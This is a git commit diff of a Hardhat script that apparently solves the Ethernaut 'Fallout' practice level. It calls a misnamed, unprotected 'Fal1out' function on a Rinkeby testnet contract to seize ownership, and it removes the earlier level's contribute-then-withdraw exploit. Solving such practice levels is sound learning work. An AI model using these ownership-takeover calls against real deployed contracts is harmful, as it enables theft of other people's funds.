a0499438beb02741f295b437c7a075e054f90b72
pongtsu <alwayshungrytolearn@gmail.com>
2022-09-21 16:13:40 +0700

    feat: Fallout.

--- scripts/fallout.ts
+++ scripts/fallout.ts
@@ -2,31 +2,35 @@ import { ethers } from "hardhat"
 
 const main = async () => {
   const [deployer] = await ethers.getSigners()
-  const contractAddress = "0x97C84E26E4f0E850567Aab85980911c11B8324Ba"
+  const contractAddress = "0x5F9FcfCd923b0326C9d9d6769a0Fd794d6A78b38"
   const abi = [
     {
       inputs: [],
-      stateMutability: "nonpayable",
-      type: "constructor",
-    },
-    {
-      inputs: [],
-      name: "contribute",
+      name: "Fal1out",
       outputs: [],
       stateMutability: "payable",
       type: "function",
       payable: true,
-      signature: "0xd7bb99ba",
+      signature: "0x6fab5ddf",
+    },
+    {
+      inputs: [],
+      name: "allocate",
+      outputs: [],
+      stateMutability: "payable",
+      type: "function",
+      payable: true,
+      signature: "0xabaa9916",
     },
     {
       inputs: [
         {
           internalType: "address",
-          name: "",
+          name: "allocator",
           type: "address",
         },
       ],
-      name: "contributions",
+      name: "allocatorBalance",
       outputs: [
         {
           internalType: "uint256",
@@ -37,22 +41,15 @@ const main = async () => {
       stateMutability: "view",
       type: "function",
       constant: true,
-      signature: "0x42e94c90",
+      signature: "0xffd40b56",
     },
     {
       inputs: [],
-      name: "getContribution",
-      outputs: [
-        {
-          internalType: "uint256",
-          name: "",
-          type: "uint256",
-        },
-      ],
-      stateMutability: "view",
+      name: "collectAllocations",
+      outputs: [],
+      stateMutability: "nonpayable",
       type: "function",
-      constant: true,
-      signature: "0xf10fdf5c",
+      signature: "0x8aa96f38",
     },
     {
       inputs: [],
@@ -70,37 +67,30 @@ const main = async () => {
       signature: "0x8da5cb5b",
     },
     {
-      inputs: [],
-      name: "withdraw",
+      inputs: [
+        {
+          internalType: "address payable",
+          name: "allocator",
+          type: "address",
+        },
+      ],
+      name: "sendAllocation",
       outputs: [],
       stateMutability: "nonpayable",
       type: "function",
-      signature: "0x3ccfd60b",
-    },
-    {
-      stateMutability: "payable",
-      type: "receive",
-      payable: true,
+      signature: "0xa2dea26f",
     },
   ]
   const contract = await ethers.getContractAt(abi, contractAddress)
-  const tx = await contract.contribute({
-    value: ethers.utils.parseEther("0.0001"),
+  const tx = await contract.Fal1out({
+    value: ethers.utils.parseEther("0.000001"),
   })
   const receipt = await tx.wait()
-  console.log(`tx at ${receipt}`)
-
-  const result = await contract.getContribution()
-  console.log(`tx at ${ethers.utils.formatEther(result)} ETH`)
-
-  await deployer.sendTransaction({
-    to: contractAddress,
-    value: ethers.utils.parseEther("0.000000001"),
-  })
+  console.log(
+    `tx at https://rinkeby.etherscan.io/tx/${receipt.transactionHash}`
+  )
 
   console.log(`who is owner ${await contract.owner()}`)
-
-  await contract.withdraw()
 }
 
 main()
